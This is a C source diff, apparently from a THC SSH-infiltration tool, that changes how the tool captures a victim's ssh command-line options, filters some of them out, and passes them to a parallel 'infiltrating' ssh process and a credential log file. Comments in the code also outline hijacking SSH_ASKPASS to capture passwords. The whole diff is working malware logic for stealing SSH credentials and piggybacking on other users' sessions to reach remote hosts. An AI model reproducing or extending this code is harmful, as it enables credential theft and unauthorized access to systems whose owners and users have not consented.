@@ -16,7 +16,8 @@ static int fd_package;
 static LNBUF lnb_i;  // infiltrating line buffer
 static bool g_is_pty_pause;
 static bool g_is_waiting_at_prompt_i;
-static int g_ssh_param_argc;
+static char **g_ssh_inf_argv;
+static int g_ssh_inf_argc;
 static bool g_is_logged_in;
 static struct termios g_tios_saved;
 static bool g_is_tios_saved;
@@ -183,7 +184,6 @@ init_vars(int *argc_ptr, char **argv_ptr[])
 	g_is_already_logged_ssh_credentials = false;
 	is_fd_i_blocking = false;
 	pid_i = 0;
-	g.ssh_param[0] = '\0';
 	g.recheck_time = THC_RECHECK_TIME;
 	g_db_trysec = THC_DB_TRY_SEC;
 	g_is_pty_pause = false;
@@ -477,13 +477,14 @@ static bool
 is_need_sniffing_ssh(int argc, char *argv[])
 {
 	int c;
+	int n;
 	// Scroll through all ssh options until we hit 'destination'
 	// [user@]hostname or ssh://[user@]hostname[:port]
 	// -l/-p always have presedence over user@ and :port.
 	char *login_name = NULL;
 
 	opterr = 0;
-	while ((c = getopt(argc, argv, "B:b:c:D:E:e:F:I:i:J:L:l:m:O:o:p:Q:R:S:W:w:")) != -1)
+	while ((c = getopt(argc, argv, "XYyfgMNntv" "B:b:c:D:E:e:F:I:i:J:L:l:m:O:o:p:Q:R:S:W:w:")) != -1)
 	{
 		switch (c)
 		{
@@ -497,6 +498,50 @@ is_need_sniffing_ssh(int argc, char *argv[])
 			g.keyfile = strdup(optarg);
 			break;
 		}
+
+		// Blacklist: "D:E:L:R:W:w:XYyfgMNntv"
+		// The infiltration process must not use some of the args specified to the original ssh.
+		// For example passing -L port:IP to infiltration process would block the port
+		// for the real ssh. Filter those nasty ssh options out here...
+		switch (c)
+		{
+			case 'D':
+			case 'E':
+			case 'L':
+			case 'R':
+			case 'W':
+			case 'w':
+				DEBUGF("Ignoring -%c %s\n", optopt, optarg);
+				break;
+			case 'X':
+			case 'Y':
+			case 'y':
+			case 'f':
+			case 'g':
+			case 'M':
+			case 'N':
+			case 'n':
+			case 't':
+			case 'v':
+				DEBUGF("Ignoring -%c\n", optopt);
+				break;
+			case '?':
+				DEBUGF("arg = -%c [optind=%d, %s]\n", optopt, optind, argv[optind - 1]);
+				n = g_ssh_inf_argc;
+				g_ssh_inf_argv = realloc(g_ssh_inf_argv, (n + 1) * sizeof (char *));
+				g_ssh_inf_argv[n] = argv[optind - 1];
+				g_ssh_inf_argc += 1;
+				break;
+			default:
+				DEBUGF("Arg = -%c [optind=%d, %s], %s\n", optopt, optind, argv[optind - 2], optarg);
+				n = g_ssh_inf_argc;
+				g_ssh_inf_argv = realloc(g_ssh_inf_argv, (n + 2) * sizeof (char *));
+				g_ssh_inf_argv[n] = argv[optind - 2];
+				g_ssh_inf_argv[n + 1] = optarg;
+				g_ssh_inf_argc += 2;
+				break;
+
+		}
 	}
 
 	if (argv[optind] == NULL)
@@ -509,9 +554,6 @@ is_need_sniffing_ssh(int argc, char *argv[])
 	int is_url = false;
 
 	// ssh <arguments> destination [command]
-	// Remove destination and all '[command]'
-	g_ssh_param_argc = optind;
-
 	g.ssh_destination = strdup(destination);
 
 	if (strncmp(destination, "ssh://", 6) == 0)
@@ -551,22 +593,6 @@ is_need_sniffing_ssh(int argc, char *argv[])
 	if (login_name != NULL)
 		g.login_name = strdup(login_name);
 
-	// Store the original command line arguments (will be passed to hook.sh)
-	ptr = g.ssh_param;
-	char *end = g.ssh_param + sizeof g.ssh_param;
-	ssize_t sz;
-	for (c = 1; c < g_ssh_param_argc; c++)
-	{
-		if (c + 1 < g_ssh_param_argc)
-			sz = snprintf(ptr, end - ptr, "%s ", argv[c]);
-		else
-			sz = snprintf(ptr, end - ptr, "%s", argv[c]); // Last argument
-		if (sz >= end - ptr)
-			break;
-		ptr += sz;
-	}
-
-	DEBUGF_G("ssh_param='%s'\n", g.ssh_param);
 	// HERE: not recently checked
 	DEBUGF_W("hostname = %s-%s-%d\n", g.login_name, g.host, g.port);
 
@@ -676,25 +702,19 @@ log_ssh_credentials(void)
 	// Log ssh destination
 	fprintf(fp, "LOG_SSH_DESTINATION='%s'\n", BASH_escape_squote(buf, sizeof buf, g.ssh_destination));
 
-	// LAST LINE is always the command
-	// Log prefered command line to log in (including real target)
+	// Log all infiltration arguments
+	for (i = 0; i < g_ssh_inf_argc; i++)
+		fprintf(fp, "LOG_ARG_INF_%d='%s'\n", i, BASH_escape_squote(buf, sizeof buf, g_ssh_inf_argv[i]));
 
-	fprintf(fp, "# Last line is the preferred command:\n");
-	// fprintf(fp, "THC_TARGET=%s %s %s\n", g.target_file, g_argv_backup[0], g.ssh_param);
-	// SSH_ASKPASS is currently not supported. To support this implement:
-	// Note: Consider that SSH_ASKPASS is only executed if password is needed
-	//       and might never be executed.
+	// SSH_ASKPASS is currently not supported. Special consideration:
+	// 1. Might open a X11 GUI prompt
+	// 2. SSH_ASKPASS might be set but never been used (if password is not required)
+	// To support this implement:
 	// - infiltrating SSH to detect if SSH_ASKPASS is set and if so then:
 	//   - Create own SSH_ASKPASS script that if executed captures password.
-	// - Modify SSH_ASKPASS for real ssh to use own script:
+	// - Modify SSH_ASKPASS for real ssh to use our script:
 	//   - If password was previously captured then just output it.
 	//   - Otherwise (faillure) fall-back to original SSH_ASKPASS
-	if (askpass == NULL)
-		snprintf(buf, sizeof buf, "%.1024s %.1024s", g.ssh_param, g.ssh_destination);
-	else
-		buf[0] = '\0'; // FIXME: add SSH_ASKPASS support
-
-	fprintf(fp, "# %s\n", buf);
 	fclose(fp);
 
 	g_is_already_logged_ssh_credentials = true;
@@ -1136,8 +1156,13 @@ infiltrate_ssh(void)
 {
 	DEBUGF("INFILTRATING....\n");
 	char buf[1024];
+	int n;
 
-	setenv("THC_SSH_PARAM", g.ssh_param, 1);
+	for (n = 0; n < g_ssh_inf_argc; n++)
+	{
+		snprintf(buf, sizeof buf, "THC_SSH_INF_ARG_%d", n);
+		setenv(buf, g_ssh_inf_argv[n], 1);
+	}
 	setenv("THC_SSH_DEST", g.ssh_destination, 1);
 	setenv("THC_BASEDIR_REL", g.basedir_rel, 1);
 	setenv("THC_BASEDIR_LOCAL", g.basedir_local, 1);
